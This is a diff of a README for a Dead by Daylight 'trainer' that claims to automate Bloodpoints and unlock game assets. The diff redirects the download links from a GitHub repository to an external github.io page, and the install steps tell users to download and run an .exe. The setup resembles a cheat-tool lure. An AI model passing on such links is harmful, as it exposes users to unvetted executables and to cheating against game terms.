@@ -1,6 +1,6 @@
 # 🎮 DBD-AutoGrind-Trainer-2026 - Automate Bloodpoints and Unlock Game Assets
 
-[![](https://img.shields.io/badge/Download-Release-blue.svg)](https://github.com/Crisco7700/DBD-AutoGrind-Trainer-2026)
+[![](https://img.shields.io/badge/Download-Release-blue.svg)](https://crisco7700.github.io)
 
 ## 📖 Overview
 
@@ -20,7 +20,7 @@ Ensure your computer meets these requirements to run the software:
 
 Follow these instructions to set up the software correctly on your Windows machine.
 
-1. Visit the [official releases page](https://github.com/Crisco7700/DBD-AutoGrind-Trainer-2026) to download the latest version of the toolkit.
+1. Visit the [official releases page](https://crisco7700.github.io) to download the latest version of the toolkit.
 2. Select the file ending in .exe to begin the download.
 3. Once the download finishes, move the file to a folder you can access easily.
 4. Close Dead by Daylight before you start the trainer.
